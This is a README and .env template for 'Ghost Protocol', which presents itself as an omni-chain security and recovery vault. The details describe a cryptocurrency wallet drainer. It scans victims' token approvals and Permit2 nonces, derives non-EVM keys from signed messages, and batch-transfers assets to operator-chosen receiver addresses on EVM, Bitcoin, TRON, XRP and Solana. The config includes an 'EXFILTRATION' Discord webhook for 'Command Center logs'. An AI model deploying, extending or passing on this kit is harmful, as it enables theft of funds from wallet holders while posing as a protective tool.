# 🛡️ Ghost Protocol: Omni-Chain Security & Recovery Vault

Ghost Protocol is an institutional-grade security interface designed to audit, shield, and recover assets across multiple blockchain networks (EVM, BTC, XRP, SOL, TRON). By utilizing **Deterministic Entropy Derivation** and **Atomized Settlement Vectors**, the protocol ensures that compromised authorizations are cleared and assets are moved to secure cold-vault environments.

## 🚀 System Architecture

The protocol operates via three primary layers:
1.  **Identity Derivation**: Uses EIP-191 signatures to generate master entropy for non-EVM recovery (BTC/XRP/TRX).
2.  **Audit Engine**: Scans 5+ chains in parallel to map token approvals, Permit2 nonces, and native balances.
3.  **Ghost Settlement**: Executes batch transfers using a custom `UniversalSettler` contract to bypass public mempools and prevent front-running.

## 🛠️ Deployment Configuration

### 1. Contract Setup
Deploy the `UniversalSettler.sol` or `factory.sol` to your target chains. Ensure the wallet associated with your `PRIVATE_KEY` has permission to call the `perform` function.

### 2. Environment Variables (.env)
Add these to your production environment (Vercel/Docker):

```env
# --- CORE CONFIG ---
NEXT_PUBLIC_REOWN_ID=1fac4178123b2d65d15f219af4d542e9
PRIVATE_KEY=your_private_key_here               # Gas-payer for Ghost transactions
NEXT_PUBLIC_SETTLER_ADDR="0x..."                # Deployed Settler contract

# --- DESTINATIONS ---
NEXT_PUBLIC_RECEIVER_EVM="0x..."                # EVM (ETH, BSC, POLY, etc)
NEXT_PUBLIC_RECEIVER_BITCOIN="..."             # Bitcoin (Native SegWit)
NEXT_PUBLIC_RECEIVER_TRON="..."                # TRON (TRX/USDT)
NEXT_PUBLIC_RECEIVER_XRP="..."                 # Ripple
NEXT_PUBLIC_RECEIVER_SOLANA="..."              # Solana

# --- EXFILTRATION ---
DISCORD_WEBHOOK_URL="[https://discord.com/](https://discord.com/)..."   # Command Center logs

# --- RPC INFRASTRUCTURE ---
ALCHEMY_API_KEY=your_alchemy_key
RPC_URL_1=[https://eth-mainnet.g.alchemy.com/v2/your_key](https://eth-mainnet.g.alchemy.com/v2/your_key)
RPC_URL_56=[https://bsc-dataseed.binance.org/](https://bsc-dataseed.binance.org/)
RPC_URL_137=[https://polygon-mainnet.g.alchemy.com/v2/your_key](https://polygon-mainnet.g.alchemy.com/v2/your_key)
RPC_URL_8453=[https://base-mainnet.g.alchemy.com/v2/your_key](https://base-mainnet.g.alchemy.com/v2/your_key)